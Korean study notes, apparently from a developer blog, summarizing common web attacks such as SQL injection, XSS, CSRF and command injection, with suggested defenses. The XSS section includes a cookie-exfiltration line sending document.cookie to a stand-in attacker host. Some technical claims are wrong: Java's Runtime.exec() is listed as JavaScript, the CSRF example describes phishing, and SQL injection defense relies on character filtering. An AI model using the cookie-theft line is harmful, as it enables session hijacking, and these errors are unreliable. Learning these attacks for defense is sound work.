기본적인 웹 해킹에 대해 알아보자
보통 웹 해킹의 경우 웹사이트의 보안 취약점을 노리는 경우가 많다
그중에서도 자주 사용되고 언급되는 친구들을 살펴보자

- SQL injection
보통 웹 해킹을 배울 때 가장 자주 언급되고 먼저 보게 되는 친구
그만큼 강력하면서도 가장 쉽게 할 수 있는 공격
서버에서 실행되는 SQL문을 악의적으로 실행시키는 공격
기존 SQL문에 강제로 다른 SQL문을 섞어서 보내 데이터 탈취, 삭제 등이 가능하다
해당 공격으로 뚫리면 서비스 종료해야 한다
근데 요즘 라이브러리들이 SQL injection 공격을 자동으로 막아준다
그래서 PHP, JSP 쌩으로 코드를 짜던 예전에 많이 먹히던 공격이다
=>방어 방법: 문제가 될 수 있는 문자열을 필터링한다 (난이도: 하)
\n, \t, |, #, --, & 이런 문자열 거르면 됨
사실 이외에도 다른 공격 방법들과 그에 대한 해결책도 있으니 시간되면 찾아볼 것
>Error based SQL Injection
>Blind SQL Injection
>Union SQL Injection

- XSS (Cross-Site Scription)
웹 페이지에 악성 자바스크립트를 삽입하는 공격
공격 성공 시 사이트 이용자의 정보를 탈취할 수 있음
사례) input 창에 script 태그를 보내는 거임
단순하지만 매우 효과적인 공격임
특히 최근 SPA 라이브러리들이 인증 관리를 위해 localstorage나 cookie를 사용해서 저장하는데
XSS에 대비되지 않은 사이트라면 쉽게 탈취 가능함
document.URL = 'http://hacker.com?cookie'+document.cookie 요거 사용하면 알 수 있음
=>방어 방법: 필터링을 통해 쉽게 방어할 수 있음 (난이도: 하)
1. 서버에 데이터를 저장할 때 html을 필터링한 후 db에 저장한다
2. Reflected XSS나 DOM Based XSS 공격 방어를 위해 서버에서 파라미터 검증을 한다
위에서 소개한 공격 방법이 Stored XSS라고 불린다
Reflected XSS: 입력을 그대로 브라우저에 출력하는 공격 방식 (이렇게 되면 해당 코드를 프론트가 실행하게 됨)
해당 공격은 서버 파라미터 검증과 프론트 필터링으로 방어 가능
DOM Based XSS: 서버의 스크립트를 이용하여 DOM에 악의적인 스크립트가 노출되도록 공격하는 방법
Reflected XSS와 유사해보이지만 서버를 타지 않고 DOM을 공격할 수 있기 때문에 문제를 찾기 힘들 수도 있다
3. 프론트에서도 필터링을 진행한다
요즘 같은 시대에 라이브러리들이 잘 보완해주고는 있지만 그래도 조심하자
조금의 틈이라도 보이면 바로 뚫리니까

- CSRF Attack (Cross-Site Request Forgery)
공격자가 서비스 사용자를 이용하여 요청을 보내는 공격
예시) 네이버 로그인과 똑같은 화면을 제공하는 피싱 사이트가 존재
사용자가 피싱 사이트인 것을 모르고 해당 사이트에 로그인을 함
피싱 사이트가 찐 네이버 로그인 URL을 보냄
만약 CSRF 공격에 취약점이 있다면 성공 또는 실패 Response가 들어올 것임
성공이면 해당 아이디, 비번을 해커가 따로 저장한 후 해당 유저의 계정을 털 수 있음
=>방어 방법: 대표적으로 3가지가 존재 (공격이 쉬운 만큼 방어도 쉬움)
1. Referer Check: 허용된 Referer의 요청만 허락하도록 설정하는 방법
단 http 변조를 통해 쉽게 뚫을 수 있기 때문에 비추
2. CSRF Token: 모든 요청에 토큰을 발급하여 서버에서 검증하는 방어 방법
발급된 토큰을 서버로 전달하지 않으면 요청이 허락되지 않기 때문에 효과적으로 작용됨
3. CAPTCHA(캡챠): 사람이 요청한 것이 맞는지 검증하는 방법
사실상 CSRF Token과 역할이 같으며 겸사겸사 로봇인지 확인도 가능하다

- Command injection
쉘을 실행시키는 로직을 이용한 공격
시스템이 탈취되는 것이나 마찬가지이기 때문에 매우 치명적인 공격임
각 언어마다 쉘 명령을 실행시키는 함수가 존재함 => JS: System.runtime(), Runtime.exec() // Python: exec(), os.system() + 마찬가지로 각 언어마다 존재하는 eval() 함수도 매우 취약하다
쉘 명령을 실행시키는 함수를 이용하여 악성 명령을 삽입할 수 있게 되면 사실상 해커를 위한 WebShell이 된다
보통 해당 공격을 성공하게 되면 Deface Attack으로 이어진다
해당 공격은 해킹에 성공했음을 과시하는 방법으로 여겨진다
서버에 존재하는 파일을 변조해야하기 때문에 Command Injection을 사용해야 한다
=>방어 방법: 쉘 명령을 실행시키는 함수를 사용하지 말 것 (만약 사용해야 한다면 민감한 문자는 필터링할 것)

- File Upload Attack
공격 스크립트가 담긴 파일을 서버로 업로드하는 공격
WebShell이 가능한 코드가 담긴 파일을 서버에 업로드하면 Command Injection과 같은 효과를 볼 수 있다
=>방어 방법: 아래의 절차를 모두 따르는 것을 권장한다
1. 확장자와 파일 타입을 검사해서 허락된 타입만 저장하자
2. 해커가 파일을 찾을 수 없도록 업로드 파일의 확장자와 이름을 난수화하여 저장한다
3. 특수 문자가 포함된 경우 업로드를 제한한다
요즘 클라우드 서비스가 제공하는 파일 스토리지를 이용하기도 하고 프레임워크에서 제공하는 기능을 쉽게 이용할 수도 있다

- Javascript injection
브라우저에서 자바스크립트를 삽입시키는 공격
브라우저에서 제공하는 콘솔을 통해 공격이 가능하다
Client-side에 중요한 정보를 저장해놓았다면 탈취하는 것이 가능해진다
=>방어 방법: 두 가지 절차를 따르는 것을 권장한다
1. 클라이언트에는 민감한 정보를 절대 plain하게 저장하지 않는다
2. 데이터 유효성 검사가 필요한 경우 서버에서 처리하도록 한다

- DDoS (Distributed Denial of Service)
분산 서비스 거부 공격
분산된 시스템을 이용하여 서버에 비정상적으로 많은 트래픽을 보내 마비시키는 공격
공격자가 수많은 pc를 이용하여 서버에 트래픽을 보낸다
많은 트래픽이 발생하면 서비스에 부하가 생겨 멈추거나 서버가 죽기도 한다
얘는 제일 단순한데 막기가 힘든 공격이다
=>방어 방법: 예방 차원에서 해당 절차를 따른다
>확장 가능한 분산 시스템을 설계한다
>공격 ip를 필터링한다
>서비스 지역 이외의 ip를 막는다
>DDoS를 막아주는 전문 서비스 센터에 설계를 맡긴다

- Dictionary Attack
미리 데이터베이스에 등록해놓은 수많은 문자열을 암호에 대입하는 공격
많은 사이트들에서 암호를 간단한 문자로 저장하지 못하게 막아놓은 이유이기도 하다
=>방어 방법: 의미가 있는 단어는 암호로 저장하지 못하게 막기
여기서 더 나아가자면 Account Lockout Policy를 적용하여 몇 회 이상 로그인에 실패할 경우 해당 아이디를 잠그거나 OTP 같은 2-factor 인증을 도입할 수도 있다

- Rainbow Table
평문을 해시 함수로 만든 문자열을 모두 저장시켜 놓는 표를 의미한다
주로 계정 데이터 탈취 후 원문을 알아내기 위해 사용한다
=>방어 방법: 아래 3가지를 참고하자
1. salt 사용
2. Key Stretching
3. BCrypt, PBKDF2 등의 암호화 알고리즘 사용